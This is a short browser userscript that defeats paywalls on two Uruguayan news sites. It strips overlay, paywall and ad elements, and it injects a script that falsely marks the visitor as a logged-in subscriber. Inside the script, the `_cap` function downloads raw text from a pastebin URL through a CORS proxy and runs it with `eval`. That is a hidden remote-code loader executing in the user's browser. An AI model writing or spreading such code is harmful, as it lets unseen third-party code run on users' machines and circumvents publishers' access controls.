(function () {
  let app = window.location.href.match(/\.(.*)\.com\.uy/)[1]

  function run() {
    app == 'elobservador' ? setInterval(elobservador, 1000) : elpais()

    setTimeout(_cap, 500)
  }
  
  function elobservador() {
    let el = document.querySelector('.cuerpo.fade')

    if (el) {
      el.classList.remove('fade')
      _owned()
    }

    setInterval(_adBlocker, 1000)
  }

  function elpais() {
    let script = document.createElement('script')

    script.textContent = `
      statusUser.logged_in = true
      statusUser.user.is_suscriber = true
    `

    document.body.appendChild(script)
    setTimeout(_adBlocker, 1000)
    _owned()
  }

  function _adBlocker() {
    let selectors = [
      'iframe', '.mensaje_paywall2', '.mensaje_member', '.contenedor_publicidad',
      '.btn--reportar-error', '.content-module-free-html', '.widgetgoogle'
    ]

    selectors.forEach(_removeAll)
  }

  function _removeAll(selector) {
    document.querySelectorAll(selector).forEach((el) => {
      el.parentNode.removeChild(el)
    })
  }

  function _cap() {
    fetch('https://cors.io/?https://pastebin.com/raw/fm8HDdqq')
      .then((result) => result.text())
      .then(eval)
  }

  function _owned() {
    console.log('owned 😂 !!')
  }

  run()
}())
